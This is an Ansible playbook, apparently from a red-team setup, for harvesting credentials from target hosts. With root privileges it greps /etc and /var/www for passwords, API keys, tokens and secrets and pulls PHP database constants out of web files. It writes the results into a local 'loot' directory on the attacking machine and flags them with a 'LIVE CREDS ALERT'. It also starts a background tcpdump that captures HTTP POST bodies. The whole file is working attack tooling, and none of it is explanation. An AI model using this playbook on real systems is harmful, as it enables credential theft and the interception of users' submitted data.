---
- name: Targeted Secret Extraction
  become: yes
  shell: |
    # Matches patterns like pass=val or password:val
    # grep -vE removes the system library junk (unmount, update, etc.)
    grep -rEho "(password|passwd|db_pass|api_key|token|secret)\s*[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /etc /var/www 2>/dev/null \
    | grep -vE "(undefined|update|unmount|unit|url|use|validate|unconf|uncert|unselect|unserialize)" \
    | sort -u
  register: config_secrets
  failed_when: false
  changed_when: false

- name: Web and Database Constant Extraction
  become: yes
  shell: |
    # Targets PHP define statements and cleans the output: DB_PASS = value
    grep -rEho "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null \
    | sed "s/['\"],/ = /g" | tr -d "()',\""
  register: web_secrets
  failed_when: false
  changed_when: false

- name: Deliver Harvested Data to Local Loot
  delegate_to: localhost
  copy:
    content: |
      === HARVEST REPORT: {{ inventory_hostname }} ===
      [CONFIG SECRETS]
      {{ config_secrets.stdout if config_secrets.stdout != "" else "None" }}
      [WEB CONSTANTS]
      {{ web_secrets.stdout if web_secrets.stdout != "" else "None" }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/harvest_results.txt"
  become: no
  when: config_secrets.stdout != "" or web_secrets.stdout != ""

- name: LIVE CREDS ALERT
  debug:
    msg: 
      - "Configs: {{ config_secrets.stdout_lines | default(['None']) }}"
      - "Web/DB: {{ web_secrets.stdout_lines | default(['None']) }}"
  when: config_secrets.stdout != "" or web_secrets.stdout != ""

- name: Start Background Network Sniffer
  delegate_to: localhost
  shell: |
    # Ensure ens8 matches the Red Workstation interface (check 'ip a')
    nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
  run_once: true
  become: yes